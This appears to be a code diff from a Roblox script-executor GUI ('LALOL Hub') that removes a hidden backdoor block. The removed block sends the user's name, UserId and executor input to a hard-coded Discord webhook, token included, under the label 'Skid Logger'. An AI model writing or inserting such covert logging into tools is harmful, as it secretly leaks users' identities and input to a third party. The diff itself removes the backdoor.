@@ -1624,19 +1624,6 @@ local script = G2L["20"];
 	
 end
 
-if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then
-    local player = game:GetService("Players").LocalPlayer
-    request({
-        Url = "https://discord.com/api/webhooks/1395137173237268571/I3rrbp8lFIV74cMDiCk2EGGBBKjj4KYVWokR8GJbTvoYHSljmPu6Zh3pmzk6u1MrvWgI",
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode({
-            username = "Skid Logger",
-            content = "**User: `" .. player.Name .. "` | `" .. player.UserId .. "`** " .. GUI.Executor.ExecutorBox.TextBox.Text,
-        }),
-    })
-end
-
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
 		
